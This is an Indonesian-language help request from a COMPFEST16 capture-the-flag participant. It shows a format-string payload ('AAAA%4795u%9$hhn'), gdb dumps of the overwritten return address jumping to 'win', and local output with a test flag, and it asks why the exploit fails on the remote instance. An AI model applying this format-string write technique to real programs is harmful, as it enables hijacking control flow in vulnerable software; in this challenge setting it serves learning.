kak ini saya ada stack check fail atau apa yaa, payload saya `10` sama `AAAA%4795u%9$hhn`

```
(gdb) b *win+0
Breakpoint 1 at 0x12bf
(gdb) b *vuln+312
Breakpoint 2 at 0x149d
(gdb) r
Starting program: /home/d3ffr3u5-picoctf/chall 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (😅): 10
Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:
AAAA%4795u%9$hhn
Kamu menginput: AAAA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf730  →  0x00007fc0250c9600  →  0x0000000000000000
$rbp   : 0x00007ffe04caf770  →  0x00007ffe04caf780  →  0x0000000000000001
$rsi   : 0x00007ffe04cad610  →  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  →  0x00007fc024f14050  →  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c49d  →  <vuln+0138> leave 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  →  0x00007fc02512b2e0  →  0x000056329d10b000  →   jg 0x56329d10b047
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf730  →  0x00007fc0250c9600  →  0x0000000000000000
$rbp   : 0x00007ffe04caf770  →  0x00007ffe04caf780  →  0x0000000000000001
$rsi   : 0x00007ffe04cad610  →  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  →  0x00007fc024f14050  →  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c49d  →  <vuln+0138> leave 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  →  0x00007fc02512b2e0  →  0x000056329d10b000  →   jg 0x56329d10b047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe04caf730│+0x0000: 0x00007fc0250c9600  →  0x0000000000000000    ← $rsp
0x00007ffe04caf738│+0x0008: 0x0000001068f3c5ad
0x00007ffe04caf740│+0x0010: 0x0000000f00000001
0x00007ffe04caf748│+0x0018: 0x00007ffe04caf778  →  0x000056329d10c2bf  →  <win+0000> endbr64 
0x00007ffe04caf750│+0x0020: 0x3937342541414141
0x00007ffe04caf758│+0x0028: 0x6e68682439257535
0x00007ffe04caf760│+0x0030: 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf768│+0x0038: 0xfb6cf576f7c61c00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56329d10c48d <vuln+0128>      xor    rcx, QWORD PTR fs:0x28
   0x56329d10c496 <vuln+0131>      je     0x56329d10c49d <vuln+312>
   0x56329d10c498 <vuln+0133>      call   0x56329d10c0e0 <__stack_chk_fail@plt>
 → 0x56329d10c49d <vuln+0138>      leave  
   0x56329d10c49e <vuln+0139>      ret    
   0x56329d10c49f                  nop    
   0x56329d10c4a0 <__libc_csu_init+0000> endbr64 
   0x56329d10c4a4 <__libc_csu_init+0004> push   r15
   0x56329d10c4a6 <__libc_csu_init+0006> lea    r15, [rip+0x28cb]        # 0x56329d10ed78
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x56329d10c49d in vuln (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56329d10c49d → vuln()
[#1] 0x56329d10c2bf → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(gdb) dereference 
0x00007ffe04caf730│+0x0000: 0x00007fc0250c9600  →  0x0000000000000000    ← $rsp
0x00007ffe04caf738│+0x0008: 0x0000001068f3c5ad
0x00007ffe04caf740│+0x0010: 0x0000000f00000001
0x00007ffe04caf748│+0x0018: 0x00007ffe04caf778  →  0x000056329d10c2bf  →  <win+0000> endbr64 
0x00007ffe04caf750│+0x0020: 0x3937342541414141
0x00007ffe04caf758│+0x0028: 0x6e68682439257535
0x00007ffe04caf760│+0x0030: 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf768│+0x0038: 0xfb6cf576f7c61c00
0x00007ffe04caf770│+0x0040: 0x00007ffe04caf780  →  0x0000000000000001    ← $rbp
0x00007ffe04caf778│+0x0048: 0x000056329d10c2bf  →  <win+0000> endbr64 
(gdb) 
```

terus disini saya continue

```
(gdb) c
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf780  →  0x0000000000000001
$rbp   : 0x00007ffe04caf780  →  0x0000000000000001
$rsi   : 0x00007ffe04cad610  →  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  →  0x00007fc024f14050  →  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c2bf  →  <win+0000> endbr64 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  →  <main+0000> endbr64 
$r14   : 0x0               
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf780  →  0x0000000000000001
$rbp   : 0x00007ffe04caf780  →  0x0000000000000001
$rsi   : 0x00007ffe04cad610  →  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  →  0x00007fc024f14050  →  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c2bf  →  <win+0000> endbr64 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  →  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  →  0x00007fc02512b2e0  →  0x000056329d10b000  →   jg 0x56329d10b047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe04caf780│+0x0000: 0x0000000000000001   ← $rsp, $rbp
0x00007ffe04caf788│+0x0008: 0x00007fc024edbd90  →  <__libc_start_call_main+0080> mov edi, eax
0x00007ffe04caf790│+0x0010: 0x0000000000000000
0x00007ffe04caf798│+0x0018: 0x000056329d10c249  →  <main+0000> endbr64 
0x00007ffe04caf7a0│+0x0020: 0x0000000100000000
0x00007ffe04caf7a8│+0x0028: 0x00007ffe04caf898  →  0x00007ffe04cb1759  →  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf7b0│+0x0030: 0x0000000000000000
0x00007ffe04caf7b8│+0x0038: 0xb42f49020954b724
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x56329d10c2b0 <main+0067>      call   0x56329d10c365 <vuln>
   0x56329d10c2b5 <main+006c>      mov    edi, 0x1
   0x56329d10c2ba <main+0071>      call   0x56329d10c150 <exit@plt>
 → 0x56329d10c2bf <win+0000>       endbr64 
   0x56329d10c2c3 <win+0004>       push   rbp
   0x56329d10c2c4 <win+0005>       mov    rbp, rsp
   0x56329d10c2c7 <win+0008>       sub    rsp, 0x120
   0x56329d10c2ce <win+000f>       mov    rax, QWORD PTR fs:0x28
   0x56329d10c2d7 <win+0018>       mov    QWORD PTR [rbp-0x8], rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x56329d10c2bf in win (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56329d10c2bf → win()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
(gdb)
```

nah ini kan dah di `win` kan kak, tapi kok kalau saya jalanin lokal emang dah muncul output `Semoga masih gampang banged yh` sama flag,
tapi di instance aslinya kok outputnya cuma sampai `Kamu menginput: AAAA` terus malah `Ncat: Connection reset by peer.`...

```
$ ./chall                              
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (😅): 10
Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:
AAAA%4795u%9$hhn
Kamu menginput: AAAA  2871707968Semoga masih gampang banged yh
COMPFEST16{testflag}
```
